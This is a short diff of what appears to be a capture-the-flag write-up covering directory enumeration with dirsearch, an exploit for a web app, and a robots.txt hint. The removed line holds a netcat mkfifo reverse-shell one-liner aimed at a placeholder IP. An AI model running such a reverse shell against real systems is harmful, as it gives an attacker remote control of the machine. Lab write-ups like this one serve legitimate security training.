@@ -18,8 +18,6 @@ I use ` dirsearch <IP>' to find hidden url of the website have path /buttons, /r
 ![img](CTF_img/THM_CTFVOL2/RECON_2.png) and ww see the version of that app using expoit in link below
 
 
-Acces the webshell and using reverse shell escalation using this `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f` to the web shell
-
 ** Easter 1 **
 
 Hint: robots.txt
